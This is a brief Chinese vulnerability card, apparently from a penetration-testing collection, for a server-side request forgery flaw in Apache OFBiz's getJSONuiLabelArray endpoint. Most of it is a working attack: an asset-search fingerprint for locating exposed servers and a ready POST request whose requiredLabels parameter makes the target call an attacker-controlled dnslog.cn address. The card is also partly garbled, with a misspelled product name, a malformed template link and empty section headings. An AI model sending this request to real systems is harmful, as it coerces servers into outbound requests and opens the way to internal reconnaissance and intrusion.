# ApaceOFBizgetJSONuiLabelArray存在服务端请求伪造ssrf漏洞

- **系统**：ApaceOFBizgetJSONuiLabelArray　|　**类型**：SSRF　|　**CVE**：—
- **指纹**：`app="Apache_OFBiz"`
- **请求**：`POST /partymgr/control/getJSONuiLabelArray HTTP/1.1`

**请求体 / payload**
```
1. 获取dnslog地址
v3f9em.dnslog.cn
2. 测试是否存在漏洞
Host:
Content-Length: 79
Content-Type: application/x-www-form-urlencoded
requiredLabels={"https://v3f9em.dnslog.cn/api":["2aZ6okJyCI0H8XLAUeiv9Yu3wOK"]}

\[apache-OFBiz-getjsonuilabelarray-服务端请求伪造.yaml]\(公众号：渗透安全HackTwo>
```

**其他**
- Apace OFBiz getJSONuiLabelArray存在服务端请求伪造ssrf漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * Apace OFBiz